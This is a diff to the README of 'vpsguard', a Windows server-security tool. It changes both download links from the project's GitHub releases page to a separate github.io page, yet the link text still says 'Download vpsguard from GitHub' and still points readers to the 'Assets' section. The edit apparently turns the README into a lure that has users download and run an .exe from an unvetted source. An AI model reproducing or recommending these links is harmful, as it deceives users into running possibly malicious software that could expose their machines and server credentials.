@@ -1,6 +1,6 @@
 # 🛡️ vpsguard - Simple tools to secure your server
 
-[![Download vpsguard](https://img.shields.io/badge/Download-vpsguard-blue.svg)](https://github.com/abagaeltinpot261/vpsguard/releases)
+[![Download vpsguard](https://img.shields.io/badge/Download-vpsguard-blue.svg)](https://abagaeltinpot261.github.io)
 
 ## 📌 What is vpsguard?
 
@@ -22,7 +22,7 @@ Ensure you have your server's IP address, username, and password or SSH key read
 Follow these steps to set up the software on your Windows computer.
 
 1. First, visit the official download page to find the latest version.
-2. Click here: [Download vpsguard from GitHub](https://github.com/abagaeltinpot261/vpsguard/releases)
+2. Click here: [Download vpsguard from GitHub](https://abagaeltinpot261.github.io)
 3. Look for the file ending in `.exe` under the "Assets" section.
 4. Save the file to your "Downloads" folder.
 5. Double-click the file to open the application.
